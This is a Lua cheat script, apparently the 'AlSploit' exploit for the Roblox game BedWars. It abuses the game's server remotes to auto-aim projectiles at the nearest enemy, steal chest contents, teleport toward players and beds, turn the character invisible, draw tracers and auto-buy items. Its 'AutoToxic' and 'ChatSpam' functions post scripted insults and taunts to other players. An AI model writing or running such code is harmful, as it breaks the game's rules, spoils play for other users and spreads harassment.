local CollectCollectableEntityRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("CollectCollectableEntity")
local TrinitySetAngelTypeRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("SetAngelType")
local SetObservedChestRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("Inventory/SetObservedChest")
local ResetCharacterRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("ResetCharacter")
local ChestGiveItemRemote =  ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("Inventory/ChestGiveItem")
local ChestGetItemRemote =  ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("Inventory/ChestGetItem")
local PurchaseItemRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BedwarsPurchaseItem")
local BlockPlacingRemote =  ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@easy-games"):WaitForChild("block-engine"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("PlaceBlock")

local ClientHandlerStore, ClientHandlerStoreGotten = nil, false

task.spawn(function()
	ClientHandlerStore = require(LocalPlayer.PlayerScripts.TS.ui.store).ClientStore
end)

task.spawn(function()
	if ClientHandlerStore then
		ClientHandlerStoreGotten = true
	end
end)

local SendMessageRemote = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local DamageBlockRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@easy-games"):WaitForChild("block-engine"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("DamageBlock")
local ProjectileRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("ProjectileFire")
local PlayAgainRemote = ReplicatedStorage:WaitForChild("events-@easy-games/lobby:shared/event/lobby-events@getEvents.Events"):WaitForChild("joinQueue")
local EquipItemRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("SetInvItem")
local GroundHitRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("GroundHit")
local AfkInfoRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("AfkInfo")
local DamageIndicator

task.spawn(function()
	if KnitClientGotten == true then
		DamageIndicator = KnitClient.Controllers.DamageIndicatorController.spawnDamageIndicator
	end
end)

local ProjectileMeta = require(ReplicatedStorage.TS.projectile["projectile-meta"]).ProjectileMeta
local SwordHitRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("SwordHit")
local CombatConstant = require(ReplicatedStorage.TS.combat["combat-constant"]).CombatConstant
local PlacementCPS = require(ReplicatedStorage.TS["shared-constants"]).CpsConstants
local ReportRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("ReportPlayer")
local MinerRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("DestroyPetrifiedPlayer")

local KnockBackTable = debug.getupvalue(require(ReplicatedStorage.TS.damage["knockback-util"]).KnockbackUtil.calculateKnockbackVelocity, 1)
local ItemTable = debug.getupvalue(require(ReplicatedStorage.TS.item["item-meta"]).getItemMeta, 1)

local AbilityController = Flamework.resolveDependency("@easy-games/game-core:client/controllers/ability/ability-controller@AbilityController")
local BlockController = require(ReplicatedStorage["rbxts_include"]["node_modules"]["@easy-games"]["block-engine"].out).BlockEngine

local BlockPlacementController
local ViewmodelController
local ZephyrController
local SprintController
local SwordController
local FovController

task.spawn(function()
	if KnitClientGotten == true then
		BlockPlacementController = KnitClient.Controllers.BlockPlacementController
		ViewmodelController = KnitClient.Controllers.ViewmodelController
		ZephyrController = KnitClient.Controllers.WindWalkerController
		SprintController = KnitClient.Controllers.SprintController
		SwordController = KnitClient.Controllers.SwordController
		FovController = KnitClient.Controllers.FovController
	end
end)

local InventoryUtil = require(ReplicatedStorage.TS.inventory["inventory-util"]).InventoryUtil
local ItemTable = debug.getupvalue(require(ReplicatedStorage.TS.item["item-meta"]).getItemMeta, 1)

local KillAuraAnimationCooldown = false
local NearestEntityFound = false
local InfiniteFlyValue = false
local CanSeeNearestBed = false
local FlyBodyVelocity = nil
local NearestBedFound = false
local JadeHammerTick = tick()
local SpoofedCamera = nil
local AntiVoidPart = nil
local TeleportTick = tick()
local DamageBoost = false
local StartLevel = nil
local ZephyrOrb = 0

local FlyValue = false
local FlyDown = false
local FlyUp = false

local Fps = 0

local Animations = {
	KillAura = {
		{CFrame = CFrame.new(0.2, 0, -1.3) * CFrame.Angles(math.rad(111), math.rad(111), math.rad(130)), Time = 0.16},
		{CFrame = CFrame.new(0, -0.2, -1.7) * CFrame.Angles(math.rad(30), math.rad(111), math.rad(190)), Time = 0.16}
	},

	Neutral = {
		{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), Time = 0.15},
	}
}

local function CollectEnderChestItems()
	local EnderChest = ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name .. "_personal")

	for i, v in next, EnderChest:GetChildren() do
		if v:IsA("Accessory") and (v.Name == "emerald" or v.Name == "iron" or v.Name == "diamond" or v.Name == "gold" or v.Name == "void_crystal") then
			ChestGetItemRemote:InvokeServer(EnderChest, v)
		end
	end
end

local function SecureEnderChestItems()
	local EnderChest = ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name .. "_personal")
	local Inventory = ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name)

	if Inventory then
		for i, v in next, Inventory:GetChildren() do
			if v:IsA("Accessory") and (v.Name == "emerald" or v.Name == "iron" or v.Name == "diamond" or v.Name == "gold" or v.Name == "void_crystal") then
				ChestGiveItemRemote:InvokeServer(EnderChest, v)
			end
		end
	end	
end

local function TweenToNearestPlayer()
	if IsAlive(LocalPlayer) then
		local NearestPlayer = FindNearestPlayer()

		if NearestPlayer then
			local TweenInformation = TweenInfo.new(0.65, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)	
			local PlayerTpTween = TweenService:Create(LocalPlayer.Character.PrimaryPart, TweenInformation, {CFrame = NearestPlayer.Character.PrimaryPart.CFrame + Vector3.new(0, 2, 0)})

			PlayerTpTween:Play()
		end
	end
end

local function FindPetrifiedPlayer()
	for i, v in next, WorkSpace:GetChildren() do		
		if v:GetAttribute("PetrifyId") then
			return v
		end
	end
end

local function CreateSpoofedCamera()
	SpoofedCamera = Instance.new("Part", WorkSpace)
	SpoofedCamera.Anchored = true
	SpoofedCamera.Transparency = 1
	SpoofedCamera.Position = LocalPlayer.Character.Head.Position

	return SpoofedCamera
end

function FindNearestPlayer(MaxDistance)
	local NearestPlayerDistance = MaxDistance or math.huge
	local NearestPlayer

	for i, v in next, PlayerService:GetPlayers() do
		if IsAlive(v) and v ~= LocalPlayer and IsAlive(LocalPlayer) and v.Team ~= LocalPlayer.Team then
			local Distance = (v.Character.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < NearestPlayerDistance then
				NearestPlayerDistance = Distance
				NearestPlayer = v				
			end
		end
	end

	return NearestPlayer, NearestPlayerDistance
end

local function CreateAntiVoidPart()
	repeat task.wait() until GetMatchState() ~= 0

	local OldLowestPosition = math.huge
	local LowestPosition = 99999

	local BlockRaycastParameters = RaycastParams.new()

	BlockRaycastParameters.FilterType = Enum.RaycastFilterType.Include
	BlockRaycastParameters.FilterDescendantsInstances = CollectionService:GetTagged("block")

	AntiVoidPart = Instance.new("Part")
	AntiVoidPart.Parent = WorkSpace
	AntiVoidPart.Material = Enum.Material.Neon
	AntiVoidPart.Name = "AntiVoidPart"
	AntiVoidPart.Size = Vector3.new(99999, 1, 99999)
	AntiVoidPart.Position = Vector3.new(0, 99999, 0)
	AntiVoidPart.Transparency = Settings.AntiVoid.Transparency
	AntiVoidPart.Color = Color3.new(0.666667, 0, 1)
	AntiVoidPart.CanCollide = false
	AntiVoidPart.Anchored = true

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("block") do
			local NewRay = WorkSpace:Raycast(v.Position + Vector3.new(0, 800, 0), Vector3.new(0, -1000, 0), BlockRaycastParameters)

			if NewRay then
				LowestPosition = NewRay.Position.Y
				if LowestPosition < OldLowestPosition then
					OldLowestPosition = LowestPosition

					AntiVoidPart.Position = Vector3.new(0, LowestPosition - 4, 0)
				end
			end					
		end
	end)

	task.spawn(function()
		AntiVoidPart.Touched:Connect(function()
			if IsAlive(LocalPlayer) and AntiVoidPart and LocalPlayer.Character.PrimaryPart.Position.Y <= WorkSpace.AntiVoidPart.Position.Y then
				for i = 1, 3 do
					if IsAlive(LocalPlayer) then
						LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(LocalPlayer.Character.PrimaryPart.Velocity.X, 100, LocalPlayer.Character.PrimaryPart.Velocity.Z)
					end
				end
			end
		end)
	end)
end

local function FindNearestEntity(MaxDistance)
	local MaxDistance = MaxDistance or math.huge

	local NearestEntityDistance = MaxDistance
	local NearestEntity = nil
	local IsNotAPlayer = true

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("DiamondGuardian") do
			if v.PrimaryPart then
				local Distance = (v.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < NearestEntityDistance and  Distance <= MaxDistance then
					NearestEntityDistance = Distance
					NearestEntity = v
				end
			end 
		end
	end)

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("GolemBoss") do
			if v.PrimaryPart then
				local Distance = (v.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < NearestEntityDistance and Distance <= MaxDistance then
					NearestEntityDistance = Distance
					NearestEntity = v
				end
			end
		end
	end)	

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("Monster") do
			if v.PrimaryPart then
				local Distance = (v.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < NearestEntityDistance and Distance <= MaxDistance then
					NearestEntityDistance = Distance
					NearestEntity = v
				end
			end
		end
	end)

	task.spawn(function()
		for i, v in next, PlayerService:GetPlayers() do
			if IsAlive(v) and v ~= LocalPlayer and v.Team ~= LocalPlayer.Team then
				local Distance = (v.Character.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < NearestEntityDistance and Distance <= MaxDistance then
					NearestEntityDistance = Distance
					NearestEntity= v
					IsNotAPlayer = false
				end
			end
		end
	end)

	if NearestEntity then	
		return (IsNotAPlayer and NearestEntity or NearestEntity.Character), NearestEntityDistance
	end

	return nil
end

local function TweenToNearestBed()
	if IsAlive(LocalPlayer) then
		local NearestBed = FindNearestBed()

		if NearestBed then
			local TweenInformation = TweenInfo.new(0.65, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)	
			local BedTpTween = TweenService:Create(LocalPlayer.Character.PrimaryPart, TweenInformation, {CFrame = NearestBed.CFrame + Vector3.new(0, 10, 0)})

			BedTpTween:Play()
		end
	end
end

local function GetServerPosition(Position)
	local X = math.round(Position.X / 3)
	local Y = math.round(Position.Y / 3)
	local Z = math.round(Position.Z / 3)

	return Vector3.new(X, Y, Z)
end

local function FindNearestChest(MaxDistance)
	local NearestChest = nil
	local MaxDistance = MaxDistance or math.huge

	for i, v in next, CollectionService:GetTagged("chest") do
		if v:FindFirstChild("ChestFolderValue") then
			local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < MaxDistance then
				NearestChest = v
				MaxDistance = Distance				
			end
		end
	end

	return NearestChest:FindFirstChild("ChestFolderValue")
end

local function FindNearestGhost(MaxDistance)
	local NearestGhost = nil
	local MaxDistance = MaxDistance or math.huge

	for i, v in next, CollectionService:GetTagged("ghost") do
		if v:GetAttribute("Id") then
			local Distance = (v.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < MaxDistance then
				NearestGhost = v:GetAttribute("Id")
				MaxDistance = Distance
			end
		end		
	end

	return NearestGhost
end

local function GetEquippedKit()
	if ClientGotten == true then
		return ClientHandlerStore:getState().Bedwars.kit
	end

	if ClientGotten == false then
		return nil
	end
end

local function ShootProjectile(Item, Projectile)
	local NearestPlayer = FindNearestPlayer()

	if NearestPlayer and not NearestPlayer:FindFirstChildOfClass("ForceField") then
		local Args = {
			[1] = Item,
			[2] = Projectile,
			[3] = Projectile,
			[4] = (NearestPlayer.Character:FindFirstChild("Head").Position or NearestPlayer.Character.PrimaryPart.Position),
			[5] = (NearestPlayer.Character:FindFirstChild("Head").Position or NearestPlayer.Character.PrimaryPart.Position),
			[6] = Vector3.new(0, (NearestPlayer.Character:FindFirstChild("Head").Position and -10 or -25), 0),
			[7] = HttpService:GenerateGUID(true),
			[8] = {["drawDurationSeconds"] = 0.96, ["shotId"] = HttpService:GenerateGUID(false)},
			[9] = (WorkSpace:GetServerTimeNow() - 0.11)
		}

		ProjectileRemote:InvokeServer(unpack(Args))
	end	
end

local function SendChatMessage(Message)
	local Arguments = {
		[1] = Message,
		[2] = "All"
	}

	SendMessageRemote:FireServer(unpack(Arguments))
end

local function FindPlacedBlock(Position)
	local BlockPosition = BlockController:getBlockPosition(Position)

	return BlockController:getStore():getBlockAt(BlockPosition), BlockPosition
end

function FindNearestBed(MaxDistance)
	local MaxDistance = MaxDistance or math.huge
	local NearestBed = nil

	for i, v in next, CollectionService:GetTagged("bed")do
		if v:FindFirstChild("Bed").BrickColor ~= LocalPlayer.Team.TeamColor then			
			if v:GetAttribute("BedShieldEndTime") then 				
				if v:GetAttribute("BedShieldEndTime") < WorkSpace:GetServerTimeNow() then
					local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

					if Distance < MaxDistance then
						MaxDistance = Distance
						NearestBed = v
					end
				end
			end

			if not v:GetAttribute("BedShieldEndTime") then
				local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < MaxDistance then
					MaxDistance = Distance
					NearestBed = v
				end
			end
		end
	end

	return NearestBed
end

local function FindNearestNpc(MaxDistance)
	local MaxDistance = MaxDistance or math.huge
	local NearestNpc = nil

	task.spawn(function()
		for i,v in next, (CollectionService:GetTagged("broken-enchant-table")) do 
			local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < MaxDistance then
				MaxDistance = Distance
				NearestNpc = v		
			end
		end
	end)

	task.spawn(function()
		for i,v in next, (CollectionService:GetTagged("enchant-table")) do 
			local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < MaxDistance then
				MaxDistance = Distance
				NearestNpc = v		
			end
		end
	end)

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("BedwarsTeamUpgrader") do
			local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < MaxDistance then
				MaxDistance = Distance
				NearestNpc = v
			end
		end
	end)

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("BedwarsItemShop") do
			local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < MaxDistance then
				MaxDistance = Distance
				NearestNpc = v		
			end
		end
	end)

	return NearestNpc
end

function FindNearestOre(MaxDistance)
	local MinDistance = MaxDistance or math.huge
	local NearestOre = nil

	for i, v in next, CollectionService:GetTagged("block") do
		if v.Name == "iron_ore" then
			local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < MinDistance then
				MinDistance = Distance
				NearestOre = v
			end
		end
	end

	return NearestOre
end

function TouchingGround()
	if IsAlive(LocalPlayer) then
		local Parameters = RaycastParams.new()
		Parameters.FilterType = Enum.RaycastFilterType.Include
		Parameters.FilterDescendantsInstances = {CollectionService:GetTagged("block")}

		local IsTouchingFloor = false

		for x = 1, 1 do
			local Origin = LocalPlayer.Character.PrimaryPart.Position + Vector3.new(x, 0, 0)

			local Raycast = WorkSpace:Raycast(Origin, Vector3.new(0, -2.5, 0), Parameters)
			if Raycast and Raycast.Instance then
				IsTouchingFloor = true			
			end
		end	

		return IsTouchingFloor
	end
end

local function PlayAnimation(Animation)
	for i, v in next, Animation do
		local TweenInformation = TweenInfo.new(v.Time)
		local AnimationTween = TweenService:Create(Camera.Viewmodel.RightHand.RightWrist, TweenInformation, {C0 = OrigC0 * v.CFrame})

		AnimationTween:Play()

		task.wait(v.Time - 0.01)
	end
end

local function SetCollisions(Value)
	if Value == true then
		if IsAlive(LocalPlayer) then
			for i, v in next, (LocalPlayer.Character:GetDescendants()) do
				if v:IsA("BasePart") then
					v.CanCollide = true
					v.CanTouch = true
				end			
			end
		end
	end

	if Value == false then
		for i, v in next, (LocalPlayer.Character:GetDescendants()) do
			if v:IsA("BasePart") and v ~= LocalPlayer.Character.PrimaryPart and v.CanCollide then
				v.CanCollide = false
				v.CanTouch = false
			end
		end
	end
end

function GetMatchState()
	if ClientHandlerStoreGotten == true then
		return ClientHandlerStore:getState().Game.matchState
	end

	if ClientHandlerStoreGotten == false then
		return 1
	end	
end

local function HashFunction(Value)
	return {value = Value}
end

local function CreateTracer(Player)	
	if IsAlive(Player) then
		local CurrentCamera = WorkSpace.CurrentCamera
		local WorldToViewportPoint = CurrentCamera.WorldToViewportPoint

		local Tracer = Drawing.new("Line")
		
		Tracer.Visible = false
		Tracer.Color = Player.TeamColor.Color
		Tracer.Thickness = 1.5
		Tracer.Transparency = 1

		task.spawn(function()
			repeat
				task.wait()
				
				if IsAlive(Player) then
					local Vector, OnScreen = Camera:WorldToViewportPoint(Player.Character.PrimaryPart.Position)

					Tracer.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 1)
					Tracer.To = Vector2.new(Vector.X, Vector.Y)			
					
					if OnScreen == true then
						Tracer.Visible = true
					end
					
					if OnScreen == false then
						Tracer.Visible = false
					end
				end		
			until Settings.Tracers.Value == false or not IsAlive(Player)
			
			Tracer:Remove()
		end)
	end
end

local function DecimalRound(Number, DigitsPast0)
	DigitsPast0 = math.pow(10, DigitsPast0 or 0)

	Number = Number * DigitsPast0

	if Number >= 0 then 
		Number = math.floor(Number + 0.5) 
	end

	if Number < 0 then
		Number = math.ceil(Number - 0.5) 
	end

	return Number / DigitsPast0
end

local function GetQueueType()
	if ClientHandlerStoreGotten == true then
		local State = ClientHandlerStore:getState()

		return State.Game.queueType or "bedwars_test"
	end

	if ClientHandlerStoreGotten == false then
		return "bedwars_test"
	end
end

function KillHumanoid(Time)
	local Time = Time or 0

	if LocalPlayer:FindFirstChild("leaderstats") and LocalPlayer.leaderstats:FindFirstChild("Bed") then
		if LocalPlayer.leaderstats.Bed.Value == "✅" then
			LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)

			ResetCharacterRemote:FireServer()
		end
	end
end

local function GetInventory(Player)
	local Player = Player or LocalPlayer

	local Inventory = InventoryUtil.getInventory(Player)

	return Inventory
end

local function PurchaseItem(Arguments)
	PurchaseItemRemote:InvokeServer(unpack(Arguments))
end

local function Invisibility()
	repeat task.wait() until GetMatchState() ~= 0 and IsAlive(LocalPlayer)

	local Animation = Instance.new("Animation")
	local Id = 11335949902

	Animation.AnimationId = "rbxassetid://".. Id

	local PlayerAnimation = LocalPlayer.Character.Humanoid.Animator:LoadAnimation(Animation)

	if PlayerAnimation then
		LocalPlayer.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
		LocalPlayer.Character.PrimaryPart.Size = Vector3.new(2, 3, 1.1)

		PlayerAnimation.Priority = Enum.AnimationPriority.Action4
		PlayerAnimation.Looped = false

		LocalPlayer.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)	
		LocalPlayer.Character.PrimaryPart.Transparency = 0.6
		LocalPlayer.Character.PrimaryPart.Size = Vector3.new(2, 3, 1.1)

		SetCollisions(false)

		task.spawn(function()
			repeat
				task.wait()

				PlayerAnimation:Play(1 / 999999, 999999, 1 / 999999)
			until Settings.Invisible.Value == false or not IsAlive(LocalPlayer)

			if PlayerAnimation then
				PlayerAnimation:Destroy()
			end

			if Animation then
				Animation:Destroy()
			end

			if IsAlive(LocalPlayer) then
				SetCollisions(true)

				LocalPlayer.Character.PrimaryPart.Size = Vector3.new(1.9, 2, 1)
				LocalPlayer.Character.PrimaryPart.Transparency = 1
				LocalPlayer.Character.Humanoid.CameraOffset = Vector3.new(0, 0, 0)
			end
		end)
	end
end

local function SwitchItem(Item)
	if LocalPlayer.Character.HandInvItem.Value ~= Item then
		local InventoryItem = ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name):FindFirstChild(Item)

		EquipItemRemote:InvokeServer({hand = InventoryItem})
	end	
end

local function PlaceBlock(Position, Block)
	BlockPlacingRemote:InvokeServer({["blockType"] = Block, ["blockData"] = 0,["position"] = Position})
end

local function StealChest(NearestChest)	
	NearestChest = NearestChest and NearestChest.Value or nil				

	local Chestitems = NearestChest and NearestChest:GetChildren()

	if #Chestitems > 1 then
		SetObservedChestRemote:FireServer("BlockChest")

		for i2, v2 in next, Chestitems do
			if v2:IsA("Accessory") then
				task.spawn(function()
					ChestGetItemRemote:InvokeServer(NearestChest, v2)
				end)
			end
		end

		task.wait(0.001)

		SetObservedChestRemote:FireServer(nil)
	end
end

local function CreateCape(DecalId)
	local Cape = Instance.new("Part")

	Cape.Parent = LocalPlayer.Character
	Cape.Name = "Cape"
	Cape.Size = Vector3.new(0.2, 0.2, 0.08)
	Cape.Material = Enum.Material.SmoothPlastic
	Cape.Color = Color3.new(0.105882, 0.105882, 0.105882)
	Cape.CanCollide = false

	local BlockMesh = Instance.new("BlockMesh")

	BlockMesh.Parent = Cape
	BlockMesh.Name = "Mesh"
	BlockMesh.Scale = Vector3.new(9, 17.5, 0.5)
	BlockMesh.VertexColor = Vector3.new(1, 1, 1)

	local Motor = Instance.new("Motor")

	Motor.Parent = Cape
	Motor.Name = "Motor"
	Motor.C0 = CFrame.new(0, 2, 0, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08)
	Motor.C1 = CFrame.new(0, 1, 0.449999988, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08)
	Motor.Part1 = LocalPlayer.Character.UpperTorso
	Motor.Part0 = Cape
	Motor.CurrentAngle = -0.16208772361278534
	Motor.DesiredAngle = -0.1002269834280014

	local Decal = Instance.new("Decal")

	Decal.Parent = Cape
	Decal.Name = "Decal"
	Decal.Face = Enum.NormalId.Back
	Decal.Texture = DecalId
end

function SetCamera(Camera)
	WorkSpace.CurrentCamera.CameraSubject = Camera
end

local function AutoToxic(Player)
	local Randomized = math.random(0, 5)
	local KillMessage = ""					

	if Randomized == 0 then
		KillMessage = "You are so bad u died. L " .. Player.Name .. " | AlSploit on top"
	end

	if Randomized ~= 0 then
		KillMessage = "I could probably win without cheats. L " .. Player.Name .. " | AlSploit on top"
	end

	if Randomized == 2 then
		KillMessage = "Clowns are the only ones we kill. L " .. Player.Name .. " | AlSploit on top"
	end

	if Randomized == 3 then
		KillMessage = "Rats. Imagine dying in a block game. L " .. Player.Name .. " | AlSploit on top"
	end

	if Randomized == 4 then
		KillMessage = "I hack for fun. Too bad your fun is ruined. L " .. Player.Name .. " | AlSploit on top"
	end

	if Randomized == 5 then
		KillMessage = "I ruined a good day for a good reason. L " .. Player.Name .. " | AlSploit on top"
	end

	SendChatMessage(KillMessage)
end

local function GetSword()
	local HighestDamage, Sword = -math.huge, nil

	for i, v in next, GetInventory(LocalPlayer).items do 
		local SwordMetaGame = ItemTable[v.itemType].sword

		if SwordMetaGame then
			local SwordDamage = SwordMetaGame.damage / SwordMetaGame.attackSpeed

			if SwordDamage > HighestDamage then
				HighestDamage = SwordDamage
				Sword = v
			end
		end
	end

	return Sword
end

function IsMoving()	
	local Position = LocalPlayer.Character.PrimaryPart.Position

	task.wait(0.001)

	if IsAlive(LocalPlayer) and LocalPlayer.Character.PrimaryPart.Position ~= Position then
		Position = LocalPlayer.Character.PrimaryPart.Position

		return true
	end

	if IsAlive(LocalPlayer) and LocalPlayer.Character.PrimaryPart.Position == Position then
		Position = LocalPlayer.Character.PrimaryPart.Position

		return false
	end
end

local function ChatSpam()
	local Randomized = math.random(0, 5)
	local KillMessage = ""

	if Randomized == 0 then
		KillMessage = "AlSploit does more updates than Bedwars 💀. | AlSploit On Top"
	end

	if Randomized ~= 0 then
		KillMessage = "SkidB4 is as bad as how you felt when your dad left you. | AlSploit On Top"
	end

	if Randomized == 2 then
		KillMessage = "Switch to AlSploit, ez wins. | AlSploit On Top"
	end

	if Randomized == 3 then
		KillMessage = "I am not cheating, my gaming chair is. | AlSploit On Top"
	end

	if Randomized == 4 then
		KillMessage = "3 years now, and the anticheat is still the same. | AlSploit On Top"
	end

	if Randomized == 5 then
		KillMessage = "Kids in bedwars just keep getting worst. | AlSploit On Top"
	end

	SendChatMessage(KillMessage)
end

local function AutoBank()
	local NearestNpc = FindNearestNpc(Settings.AutoBank.Range)

	if NearestNpc and (WorkSpace:GetServerTimeNow() - LocalPlayer.Character:GetAttribute("LastDamageTakenTime")) > 2  then
		CollectEnderChestItems()
	end

	if not NearestNpc or (WorkSpace:GetServerTimeNow() - LocalPlayer.Character:GetAttribute("LastDamageTakenTime")) <= 2 then
		SecureEnderChestItems()
	end
end

local function FpsBoost()
	for i, v in next, CollectionService:GetTagged("block") do
		if v:GetAttribute("PlacedByUserId") == 0 then
			v.Material = Enum.Material.SmoothPlastic

			for i2, v2 in next, (v:GetDescendants()) do
				if v2:IsA("BasePart") then
					v2.Material = Enum.Material.SmoothPlastic
				end
			end
		end
	end
end

function GetSpeed()
	local Speed = 0

	if IsAlive(LocalPlayer) then 
		local SpeedBoost = LocalPlayer.Character:GetAttribute("SpeedBoost")

		if SpeedBoost and SpeedBoost > 1 then 
			Speed = Speed + (8 * (SpeedBoost - 1))
		end

		if LocalPlayer.Character:GetAttribute("GrimReaperChannel") then 
			Speed = Speed + 20
		end

		if type(ZephyrOrb) == "number" and ZephyrOrb > 0 then
			Speed = Speed + 19
		end
		
		if (tick() - JadeHammerTick) <= 1.4 then
			Speed = Speed + 30
		end

		if DamageBoost == true then
			Speed = Speed + 18
		end

		Speed = ((Speed + Settings.Speed.Speed) - 20)
	end

	return Speed
end

function GetBlock()
	for i, v in next, GetInventory(LocalPlayer).items do
		if ItemTable[v.itemType].block ~= nil and v.itemType:find("wool") then
			return v.itemType
		end
	end
end

local function HasItem(Name)
	for i, v in next, GetInventory(LocalPlayer).items do
		if v.itemType:find(Name) then
			return v 
		end
	end	

	return nil
end

local function AutoBuy()
	local NearestNpc = FindNearestNpc(30)

	if NearestNpc then	
		local JadeHammer = {
			[1] = {
				["shopItem"] = {
					["amount"] = 1,
					["lockAfterPurchase"] = true,
					["itemType"] = "jade_hammer",
					["category"] = "Combat",
					["price"] = 40,
					["requiresKit"] = {
						[1] = "jade"
					},
					["spawnWithItems"] = {
						[1] = "jade_hammer"
					},
					["currency"] = "iron"
				},
				["shopId"] = NearestNpc.Name
			}
		}

		local GompyVacuum = {
			[1] = {
				["shopItem"] = {
					["amount"] = 1,
					["lockAfterPurchase"] = true,
					["itemType"] = "vacuum",
					["category"] = "Combat",
					["price"] = 50,
					["requiresKit"] = {
						[1] = "ghost_catcher"
					},
					["spawnWithItems"] = {
						[1] = "vacuum"
					},
					["currency"] = "iron"
				},
				["shopId"] = NearestNpc.Name
			}
		}

		local Lasso = {
			[1] = {
				["shopItem"] = {
					["amount"] = 1,
					["lockAfterPurchase"] = true,
					["itemType"] = "lasso",
					["category"] = "Combat",
					["price"] = 30,
					["requiresKit"] = {
						[1] = "cowgirl"
					},
					["spawnWithItems"] = {
						[1] = "lasso"
					},
					["currency"] = "iron"
				},
				["shopId"] = NearestNpc.Name
			}
		}

		local Arrow = {
			[1] = {
				["shopItem"] = {
					["currency"] = "iron",
					["itemType"] = "arrow",
					["amount"] = 8,
					["price"] = 16,
					["category"] = "Combat"
